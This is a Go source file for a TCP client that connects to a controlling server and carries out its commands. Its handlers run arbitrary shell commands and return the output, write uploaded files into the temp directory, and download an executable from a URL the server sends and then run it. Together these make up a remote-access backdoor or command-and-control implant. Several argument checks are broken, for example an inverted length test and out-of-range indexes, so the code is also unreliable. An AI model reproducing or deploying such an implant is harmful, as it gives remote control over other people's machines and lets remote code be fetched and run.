package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"time"

	"github.com/geoirb/tcp/internal/message"
)

var (
	address     = "127.0.0.1:3333"
	connTimeout = 5 * time.Second
)

type handlerFunc func(conn net.Conn, args []string) *string

var handler map[string]handlerFunc = map[string]handlerFunc{
	message.TEST:   testHandler,
	message.SHELL:  shellHandler,
	message.FILE:   fileHandler,
	message.UPDATE: updateHandler,
}

func main() {
	msg := message.New()

	for {
		conn, err := net.Dial("tcp", address)
		for err != nil {
			conn, err = net.Dial("tcp", address)
			fmt.Printf("err connect to server: %s\n", err)
			time.Sleep(connTimeout)
		}

	LOOP:
		for {
			message, err := bufio.NewReader(conn).ReadString('\n')
			if err != nil {
				fmt.Printf("err read from server: %s\n", err)
				break LOOP
			}
			fmt.Print("Message Received:", string(message))
			t, args := msg.Processing(message)

			answer := &message
			if hFunc, isExist := handler[t]; isExist {
				answer = hFunc(conn, args)
			}

			if answer != nil {
				conn.Write([]byte(*answer + "\n"))
			}
		}
	}
}

func testHandler(_ net.Conn, _ []string) *string {
	return nil
}

func shellHandler(_ net.Conn, args []string) *string {
	var result string
	if len(args) > 0 {
		result = "not found shell command"
		return &result
	}

	name := args[0]

	// var shellArgs []string
	// if len(args) > 1 {
	// 	shellArgs = args[1:]
	// }
	output, err := exec.Command(name, args[1:]...).Output()
	if err != nil {
		result = err.Error()
	} else {
		result = string(output)
	}

	return &result
}

func fileHandler(conn net.Conn, args []string) *string {
	var result string
	if len(args) != 2 {
		result = "not found name and size of file"
		return &result
	}

	size, err := strconv.Atoi(args[2])
	if err != nil {
		result = err.Error()
		return &result
	}

	if _, err := conn.Write([]byte("ready\n")); err != nil {
		return nil
	}

	data := make([]byte, size)
	n, err := conn.Read(data)
	if err != nil {
		result = err.Error()
		return &result
	}
	if n != size {
		result = "size of received data and expected size not equal"
		return &result
	}

	file, err := os.Create(os.TempDir() + args[0])
	if err != nil {
		result = err.Error()
		return &result
	}
	defer file.Close()

	if _, err := file.Write(data); err != nil {
		result = err.Error()
		return &result
	}

	result = "done"
	return &result
}

func updateHandler(conn net.Conn, args []string) *string {
	var result string
	if len(args) != 1 {
		result = "not found url new version"
		return &result
	}

	path, err := os.Executable()
	if err != nil {
		result = err.Error()
		return &result
	}

	newExecutableFile := path + "client" + time.Now().String()
	out, err := os.Create(newExecutableFile)
	if err != nil {
		result = err.Error()
		return &result
	}
	defer out.Close()

	resp, err := http.Get(args[1])
	if err != nil {
		result = err.Error()
		return &result
	}
	defer resp.Body.Close()

	if _, err = io.Copy(out, resp.Body); err != nil {
		result = err.Error()
		return &result
	}
	out.Close()
	resp.Body.Close()

	if _, err = exec.Command(newExecutableFile).Output(); err != nil {
		result = err.Error()
		return &result
	}

	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	conn.Write([]byte("ready\n"))

	os.Exit(0)
	return nil
}
